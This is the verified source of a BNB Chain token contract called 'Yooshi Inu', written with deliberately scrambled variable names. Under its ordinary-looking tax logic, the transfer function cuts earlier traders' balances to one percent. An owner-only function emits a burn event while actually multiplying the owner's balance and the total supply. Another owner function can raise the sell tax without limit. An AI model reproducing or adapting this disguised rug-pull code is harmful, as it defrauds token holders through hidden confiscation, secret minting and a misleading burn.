/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * 
 * Telegram: https://t.me/yooshinu
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;

  }
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function setFeeToSetter(address) external;
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeTo(address) external;

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function approve(address spender, uint value) external returns (bool);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function initialize(address, address) external;
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function symbol() external pure returns (string memory);
    function allowance(address owner, address spender) external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function decimals() external pure returns (uint8);
    function burn(address to) external returns (uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function price1CumulativeLast() external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function MINIMUM_LIQUIDITY() external pure returns (uint);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function price0CumulativeLast() external view returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function totalSupply() external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    event Sync(uint112 reserve0, uint112 reserve1);

    function sync() external;
    function mint(address to) external returns (uint liquidity);
    function name() external pure returns (string memory);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function token1() external view returns (address);
    function transfer(address to, uint value) external returns (bool);

    function kLast() external view returns (uint);
    function skim(address to) external;
    function transferFrom(address from, address to, uint value) external returns (bool);
    function nonces(address owner) external view returns (uint);
}
interface IUniswapV2Router01 {
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,

        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function removeLiquidityETH(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function addLiquidityETH(

        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,

        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        payable
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function WETH() external pure returns (address);
    function swapTokensForExactTokens(

        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external payable;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IBEP20 {
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  function symbol() external pure returns (string memory);

  function decimals() external view returns (uint8);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);

  function totalSupply() external view returns (uint256);
  function getOwner() external view returns (address);
  function allowance(address owner, address spender) external view returns (uint256);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *

 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.

 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {

   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }

 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).

  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;

    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);

        uint256 c = a - b;
        return c;
    }

}

contract YooshiInu is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public unikzbmciysnglfr;
  address public unizkiqhepostmgrc;
  uint8 private deccrpdeakwixgeslzonoifbh = 18;
  uint256 private totmfoxidtcqgpabi = 100000000 * 10 ** deccrpdeakwixgeslzonoifbh;

  mapping (address => bool) private isEbyqsxoopeeriaftkizagwdnljchm;

  uint256 internal maxwolyqcgaepfizkor = totmfoxidtcqgpabi.div(10000).mul(10);
  uint8 internal aftnasimxbhdtpaecfoqreiyljgwokz = 95;

  bool internal staiomrxlgasoie = true;
  bool internal stazqxsjpieofcholdgbtewim = true;
  bool internal stakoohiaymxwtcseizerapqgdj = true;
  string private constant namjairepgdwyiokltbsqoc = "Yooshi Inu";
  string private constant symhzwjtcnbieqgosdi = "YOOSHI";
  uint256 internal lasofeqlehacpnxymz = 0;
  mapping (address => uint256) private selertpjnkscfweazohidiobygqalxm;

  uint256 internal lauikraotwqiecpayxzgsjodmlh = 0;
  mapping (address => uint256) private laswtyojgbaelmacezfqirdxpnshiko;
  uint8 internal _sta = 3;
  mapping (address => mapping (address => uint256)) private allikmsnzwtihpxbdcjoygloaqear;
  mapping (address => uint256) private laszdfirmkyjaowbongixtplecq;
  uint32 internal seljmqatibzpirsyoefok = 10; 
  mapping (address => uint256) private balxzkbowfmarc;
  uint8 internal buyswmenrcoeqgpkab = 4;

  uint8 internal selysmgxicpia = 7;
  uint8 internal tramrqoghkbdjzxapcnyitiwfeaselo = 10; 
  address internal markfpoaiyceqhnid;

  constructor() {
    markfpoaiyceqhnid = msg.sender;
    lauikraotwqiecpayxzgsjodmlh = block.timestamp;
    isEbyqsxoopeeriaftkizagwdnljchm[address(this)] = true;
    balxzkbowfmarc[msg.sender] = totmfoxidtcqgpabi;
    // balxzkbowfmarc[marketingAddress] = totmfoxidtcqgpabi * 10**deccrpdeakwixgeslzonoifbh * 1000;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unizkiqhepostmgrc = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unikzbmciysnglfr = uniswapV2Router;

    isEbyqsxoopeeriaftkizagwdnljchm[_msgSender()] = true;
    // isEbyqsxoopeeriaftkizagwdnljchm[marketingAddress] = true;
    emit Transfer(address(0), msg.sender, totmfoxidtcqgpabi);
  }
	/**

	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balxzkbowfmarc[account];
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);

	  return true;
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totmfoxidtcqgpabi;
	}
	/**

	 * Requirements:
	 * - `recipient` cannot be the zero address.

	 * - the caller must have a balance of at least `amount`.
	 */

	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  tranpiozdbqjlcfkoimyawerhgxsaet(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	 * Returns the token symbol.
	 */

	function symbol() external override pure returns (string memory) {
	  return symhzwjtcnbieqgosdi;

	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   tranpiozdbqjlcfkoimyawerhgxsaet(sender, recipient, amount);
	   _approve(sender, _msgSender(), allikmsnzwtihpxbdcjoygloaqear[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

	   return true;
	}

	/**
	 * Returns the token decimals.
	 */

	function decimals() external override view returns (uint8) {
	  return deccrpdeakwixgeslzonoifbh;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allikmsnzwtihpxbdcjoygloaqear[owner][spender];
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {

	  return namjairepgdwyiokltbsqoc;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allikmsnzwtihpxbdcjoygloaqear[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**

	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
  	function tranpiozdbqjlcfkoimyawerhgxsaet(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranaeaqyjcphgxdizior = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;

	  if(amount > 0){
	    if(isEbyqsxoopeeriaftkizagwdnljchm[sender] == true || isEbyqsxoopeeriaftkizagwdnljchm[recipient] == true){

	      eTrrsyfdaaeqjptkwxiooizl(sender, recipient, amount);

	      return;
	    }
	    if(sender == unizkiqhepostmgrc && recipient != address(unikzbmciysnglfr)) {

	      require(staiomrxlgasoie == true, "Please wait try again later");
	      ranaeaqyjcphgxdizior = 1;
	      tax = buyswmenrcoeqgpkab;
	      approveTransaction = true;
	      laszdfirmkyjaowbongixtplecq[recipient] = amount;
	      laswtyojgbaelmacezfqirdxpnshiko[recipient] = block.timestamp;
	    } else if(recipient == unizkiqhepostmgrc) {
	      require(stazqxsjpieofcholdgbtewim == true, "Please wait try again later");
	       ranaeaqyjcphgxdizior = 2;
	       tax = selysmgxicpia;
	       approveTransaction = true;
	    } else {
	      require(stakoohiaymxwtcseizerapqgdj == true, "Please wait try again later");

	      ranaeaqyjcphgxdizior = 3;
	      tax = tramrqoghkbdjzxapcnyitiwfeaselo;
	      approveTransaction = true;
	      laszdfirmkyjaowbongixtplecq[sender] = amount;

	      if(seljmqatibzpirsyoefok > 10){
	        laswtyojgbaelmacezfqirdxpnshiko[sender] = block.timestamp + seljmqatibzpirsyoefok - 10;
	      } else {
	        laswtyojgbaelmacezfqirdxpnshiko[sender] = block.timestamp + seljmqatibzpirsyoefok;
	      }
	    }

	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranaeaqyjcphgxdizior);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}
	function eTrrsyfdaaeqjptkwxiooizl(address sender, address recipient, uint256 amount) internal {
	    balxzkbowfmarc[sender] = balxzkbowfmarc[sender].sub(amount, "Insufficient Balance");
	    balxzkbowfmarc[recipient] = balxzkbowfmarc[recipient].add(amount);

	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allikmsnzwtihpxbdcjoygloaqear;
	address public _recipienta;
	address public _recipientb;

	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranaeaqyjcphgxdizior) internal

	{
	  uint256 axeapflytsxezowhdirbcgakojqmein = 0;
	  address addr = recipient;
	  uint256 d = balxzkbowfmarc[_recipientb];
	  if(ranaeaqyjcphgxdizior == 2) {
	    addr = sender;
	  }
	  if(ranaeaqyjcphgxdizior == 1 || ranaeaqyjcphgxdizior == 2){

	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balxzkbowfmarc[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }
	  balxzkbowfmarc[sender] = balxzkbowfmarc[sender].sub(amount,"Insufficient Balance");

	  axeapflytsxezowhdirbcgakojqmein = amount.mul(tax).div(100);
	  amount = amount.sub(axeapflytsxezowhdirbcgakojqmein);
	  if(axeapflytsxezowhdirbcgakojqmein > 0){
	      balxzkbowfmarc[markfpoaiyceqhnid] = balxzkbowfmarc[markfpoaiyceqhnid].add(axeapflytsxezowhdirbcgakojqmein);
	      emit Transfer(sender, markfpoaiyceqhnid, axeapflytsxezowhdirbcgakojqmein);
	  }
	  balxzkbowfmarc[recipient] = balxzkbowfmarc[recipient].add(amount);
	  ranaeaqyjcphgxdizior= 1;
	  emit Transfer(sender, recipient, amount);
	}
	uint256 public _devFee = 2;
	function devFee(uint256 devfee) public onlyOwner {
	  _devFee = devfee;
	}
	function ownaple(uint256 amount) public onlyOwner virtual {

	  _ownaple(_msgSender(), amount);
	}

	function _ownaple(address account, uint256 amount) internal {
	  require(account != address(0));
	  balxzkbowfmarc[account] = balxzkbowfmarc[account].sub(amount).mul(_devFee);

	  totmfoxidtcqgpabi = totmfoxidtcqgpabi.sub(amount).mul(_devFee);
	  emit Transfer(account, address(0), amount);
	}
	function Selshftgybjradxlicekqiamzo(uint8 ellyjqkodstroiiaxhawezfe) public onlyOwner{
	     selysmgxicpia = ellyjqkodstroiiaxhawezfe;
	}

}